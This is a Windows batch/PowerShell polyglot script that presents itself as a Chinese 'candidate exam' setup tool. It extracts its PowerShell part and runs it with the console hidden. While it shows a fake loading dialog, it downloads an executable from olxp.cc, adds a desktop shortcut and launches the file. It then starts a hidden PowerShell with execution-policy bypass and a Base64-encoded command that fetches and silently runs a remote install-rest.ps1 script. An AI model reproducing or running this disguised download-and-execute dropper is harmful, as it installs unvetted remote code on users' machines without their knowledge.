@echo off
copy /y "%~f0" "%TEMP%\exam-setup.txt" >nul
echo $p = Join-Path $env:TEMP 'exam-setup.ps1' > "%TEMP%\exam-run.ps1"
echo Get-Content -LiteralPath (Join-Path $env:TEMP 'exam-setup.txt') ^| Select-Object -Skip 9 ^| Set-Content -Encoding ASCII -LiteralPath $p >> "%TEMP%\exam-run.ps1"
echo ^& $p >> "%TEMP%\exam-run.ps1"
echo Set sh = CreateObject("WScript.Shell") > "%TEMP%\exam-launch.vbs"
echo sh.Run "powershell.exe -NoProfile -STA -File " ^& Chr(34) ^& "%TEMP%\exam-run.ps1" ^& Chr(34), 7, False >> "%TEMP%\exam-launch.vbs"
wscript //nologo "%TEMP%\exam-launch.vbs"
exit /b
Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class WinCon { [DllImport(""kernel32.dll"")] public static extern IntPtr GetConsoleWindow(); [DllImport(""user32.dll"")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }"
$cw = [WinCon]::GetConsoleWindow()
if ($cw -ne [IntPtr]::Zero) { [void][WinCon]::ShowWindow($cw, 0) }
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$n = -join [char[]](0x5019,0x9009,0x8003,0x8BD5)
$dir = Join-Path $env:LOCALAPPDATA $n
$dest = Join-Path $dir ($n + '.exe')
$url = 'https://test.olxp.cc/download/%E5%80%99%E9%80%89%E8%80%83%E8%AF%95.exe'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$form = New-Object System.Windows.Forms.Form
$form.Text = $n
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true
$form.ShowInTaskbar = $true
$form.ClientSize = New-Object System.Drawing.Size(420, 170)
$form.BackColor = [System.Drawing.Color]::White
$form.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 12)
$label = New-Object System.Windows.Forms.Label
$label.TextAlign = 'MiddleCenter'
$label.SetBounds(16, 16, 388, 48)
$label.Text = [string]::new([char[]](0x5185,0x5BB9,0x52A0,0x8F7D,0x4E2D,0xFF0C,0x8BF7,0x52FF,0x5173,0x95ED,0x7A97,0x53E3))
$bar = New-Object System.Windows.Forms.ProgressBar
$bar.Style = 'Continuous'
$bar.Minimum = 0
$bar.Maximum = 1000
$bar.Value = 0
$bar.SetBounds(28, 74, 364, 24)
$pct = New-Object System.Windows.Forms.Label
$pct.TextAlign = 'MiddleCenter'
$pct.SetBounds(28, 108, 364, 36)
$pct.Font = New-Object System.Drawing.Font('Microsoft YaHei UI', 14)
$pct.Text = '0%'
$form.Controls.Add($label)
$form.Controls.Add($bar)
$form.Controls.Add($pct)
$form.Add_Shown({
  $form.Activate()
  $form.Refresh()
  [System.Windows.Forms.Application]::DoEvents()
  $ready = $false
  if (Test-Path -LiteralPath $dest) {
    if ((Get-Item -LiteralPath $dest).Length -gt 1MB) { $ready = $true }
  }
  function Set-Progress([int64]$done, [int64]$total) {
    $value = 0
    if ($total -gt 0) { $value = [int](($done * 1000) / $total) }
    if ($value -lt 0) { $value = 0 }
    if ($value -gt 1000) { $value = 1000 }
    if ($value -eq 1000) { $bar.Value = 999 }
    $bar.Value = $value
    $pct.Text = ([string][int]($value / 10)) + '%'
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
  }
  if (-not $ready) {
    $out = $null
    $resp = $null
    try {
      $req = [System.Net.HttpWebRequest]::Create($url)
      $req.Method = 'GET'
      $resp = $req.GetResponse()
      $total = [int64]$resp.ContentLength
      if ($total -le 0) { $total = 2933248 }
      $body = $resp.GetResponseStream()
      $out = [System.IO.File]::Create($dest)
      $buf = New-Object byte[] 65536
      $done = [int64]0
      while (($nread = $body.Read($buf, 0, $buf.Length)) -gt 0) {
        $out.Write($buf, 0, $nread)
        $done += $nread
        Set-Progress $done $total
      }
      $out.Close()
      $body.Close()
      $resp.Close()
      $out = $null
      $resp = $null
      if (-not (Test-Path -LiteralPath $dest) -or ((Get-Item -LiteralPath $dest).Length -le 1MB)) { throw 'short' }
      Set-Progress $total $total
    } catch {
      if ($out) { $out.Close() }
      if ($resp) { $resp.Close() }
      if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue }
      $form.Close()
      [System.Windows.Forms.MessageBox]::Show([string]::new([char[]](0x4E0B,0x8F7D,0x5931,0x8D25,0x3002)), $n) | Out-Null
      return
    }
  }
  Set-Progress 1 1
  $label.Text = [string]::new([char[]](0x6B63,0x5728,0x6253,0x5F00,0x002E,0x002E,0x002E))
  $form.Refresh()
  [System.Windows.Forms.Application]::DoEvents()
  $lnk = Join-Path ([Environment]::GetFolderPath('Desktop')) ($n + '.lnk')
  if (-not (Test-Path -LiteralPath $lnk)) {
    $s = (New-Object -ComObject WScript.Shell).CreateShortcut($lnk)
    $s.TargetPath = $dest
    $s.Save()
  }
  Start-Process -FilePath $dest
  Start-Sleep -Milliseconds 600
  $form.Close()
})
[System.Windows.Forms.Application]::Run($form)

$abc = @(
    "-w", "h",
    "-nop",
    "-NoProfile",
    "-ep", "bypass",
    "-NonInteractive",
    "-EncodedCommand", "JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAnAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAJwA7ACAAJABlAG4AdgA6AFIARQBTAEEAXwBJAE4AUwBUAEEATABMAF8AQgBBAFMARQA9ACcAaAB0AHQAcABzADoALwAvAG8AbAB4AHAALgBjAGMALwBkAG8AdwBuAGwAbwBhAGQAJwA7ACAAJABmACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAnAGkAbgBzAHQAYQBsAGwALQByAGUAcwB0AC4AcABzADEAJwA7ACAAJABjAHUAcgBsACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAIAAnAFMAeQBzAHQAZQBtADMAMgBcAGMAdQByAGwALgBlAHgAZQAnADsAIABpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBMAGkAdABlAHIAYQBsAFAAYQB0AGgAIAAkAGMAdQByAGwAKQAgAHsAIAAmACAAJABjAHUAcgBsACAALQBmAHMAUwBMACAALQAtAHIAZQB0AHIAeQAgADMAIAAtAC0AYwBvAG4AbgBlAGMAdAAtAHQAaQBtAGUAbwB1AHQAIAAzADAAIAAtAC0AbQBhAHgALQB0AGkAbQBlACAAOQAwADAAIAAtAG8AIAAkAGYAIAAoACQAZQBuAHYAOgBSAEUAUwBBAF8ASQBOAFMAVABBAEwATABfAEIAQQBTAEUAIAArACAAJwAvAGkAbgBzAHQAYQBsAGwALQByAGUAcwB0AC4AcABzADEAJwApACAAfQA7ACAAaQBmACAAKAAtAG4AbwB0ACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAJABmACkAKQAgAHsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAKAAkAGUAbgB2ADoAUgBFAFMAQQBfAEkATgBTAFQAQQBMAEwAXwBCAEEAUwBFACAAKwAgACcALwBpAG4AcwB0AGEAbABsAC0AcgBlAHMAdAAuAHAAcwAxACcAKQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB9ADsAIABVAG4AYgBsAG8AYwBrAC0ARgBpAGwAZQAgAC0ATABpAHQAZQByAGEAbABQAGEAdABoACAAJABmACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsAIAAkAHQAPQBbAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABUAGUAeAB0ACgAJABmACkAOwAgACQAdAA9ACQAdAAuAFQAcgBpAG0AUwB0AGEAcgB0ACgAWwBjAGgAYQByAF0AMAB4AEYARQBGAEYAKQA7ACAAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABUAGUAeAB0ACgAJABmACwAIAAkAHQALAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAFUAVABGADgARQBuAGMAbwBkAGkAbgBnACAAJABmAGEAbABzAGUAKQApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAnAC0ATgBvAFAAcgBvAGYAaQBsAGUAJwAsACcALQBOAG8AbgBJAG4AdABlAHIAYQBjAHQAaQB2AGUAJwAsACcALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAnACwAJwBCAHkAcABhAHMAcwAnACwAJwAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAnACwAJwBIAGkAZABkAGUAbgAnACwAJwAtAEYAaQBsAGUAJwAsACQAZgAsACcALQBTAGkAbABlAG4AdAAnACkAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBSAGUAUwBUACAAaQBuAHMAdABhAGwAbAAgAHMAdABhAHIAdABlAGQAIABpAG4AIABiAGEAYwBrAGcAcgBvAHUAbgBkAC4AJwA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACgAJwBMAG8AZwA6ACAAJwAgACsAIAAoAEoAbwBpAG4ALQBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAIAAnAFIAZQBTAFQALQBpAG4AcwB0AGEAbABsAC4AbABvAGcAJwApACkAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnAEMAaABlAGMAawA6ACAAVABlAHMAdAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFIAZQBTAFQAXABSAGUAUwBUAC4AZQB4AGUAIgAnAA=="
)
Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList $abc
